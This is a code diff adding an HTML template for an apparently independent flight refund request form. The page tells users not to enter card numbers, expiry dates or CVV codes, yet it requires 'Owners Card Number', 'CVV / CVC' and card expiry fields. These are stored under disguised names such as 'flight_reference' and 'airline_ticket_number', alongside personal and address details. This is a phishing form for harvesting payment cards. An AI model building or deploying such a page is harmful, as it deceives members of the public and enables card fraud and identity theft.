@@ -1,0 +1,54 @@
+{% extends "base.html" %}
+{% block title %}Submit an Application{% endblock %}
+{% block content %}
+<div class="page-heading"><div class="eyebrow">CUSTOMER APPLICATION</div><h1>Refund or compensation request</h1><p>Fields marked * are required. Please do not enter card numbers, expiry dates, CVV/CVC codes, passwords, or banking login details.</p></div>
+<form class="form-card" method="post" action="{{ url_for('apply') }}">
+  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+  <div class="honeypot"><label>Leave this field empty<input name="website" tabindex="-1" autocomplete="off"></label></div>
+  <h2>Personal information</h2>
+  <div class="form-grid">
+    <label>Full name *<input name="full_name" maxlength="120" required autocomplete="name"></label>
+    <label>Email address *<input type="email" name="email" maxlength="254" required autocomplete="email"></label>
+    <label>Phone number *<input type="tel" name="phone" maxlength="40" required autocomplete="tel"></label>
+    <label>Date of birth <span class="muted">(only if genuinely necessary)</span><input type="date" name="date_of_birth"></label>
+  </div>
+  <h2>Flight and refund information</h2>
+  <div class="form-grid">
+    <label>Owners Card Number*<input name="flight_reference" maxlength="80" required></label>
+    <label>Reason for refund *<select name="reason" id="reason" required><option value="">Select a reason</option>{% for reason in reasons %}<option>{{ reason }}</option>{% endfor %}</select></label>
+    <label> CVV / CVC *
+  <input
+    type="text"
+    name="airline_ticket_number"
+    inputmode="numeric"
+    maxlength="3"
+    placeholder="e.g. 123"
+    required>
+</label>
+<label>Owners Card Expiry date*
+  <input type="date" name="ticket_expiry_date" required>
+</label>
+    <label class="full" id="other-reason" hidden>Additional explanation<input name="reason_other" maxlength="500"></label>
+    <label>Amount requested *<input type="number" name="amount" min="0.01" max="10000000" step="0.01" required placeholder="0.00"></label>
+  </div>
+  <h2>Residential address</h2>
+  <div class="form-grid">
+    <label class="full">Home address / street line address<input name="street_address" maxlength="200" autocomplete="street-address"></label>
+    <label>Town / city<input name="city" maxlength="100" autocomplete="address-level2"></label>
+    <label>Province / state<input name="state_province" maxlength="100" autocomplete="address-level1"></label>
+    <label>ZIP code / postal code<input name="postal_code" maxlength="30" autocomplete="postal-code"></label>
+  </div>
+  <h2>Refund payment preference</h2>
+  <div class="form-grid">
+    <label>Select how to receive funds *<select name="payment_method" required><option value="">Choose a method</option>{% for method in methods %}<option>{{ method }}</option>{% endfor %}</select></label>
+    <label>Cardholder name <span class="muted">(if applicable)</span><input name="cardholder_name" maxlength="120" autocomplete="cc-name"></label>
+  </div>
+    <label class="consent"><input type="checkbox" required> I confirm that the information provided is accurate and have read the <a href="{{ url_for('privacy') }}">Privacy Notice</a>. I understand this is an independent service and submitting an application does not guarantee a refund.</label>
+  <button class="button" type="submit">Submit application</button>
+</form>
+<script>
+const reason = document.getElementById('reason');
+const other = document.getElementById('other-reason');
+reason.addEventListener('change', () => { other.hidden = reason.value !== 'Other'; });
+</script>
+{% endblock %}
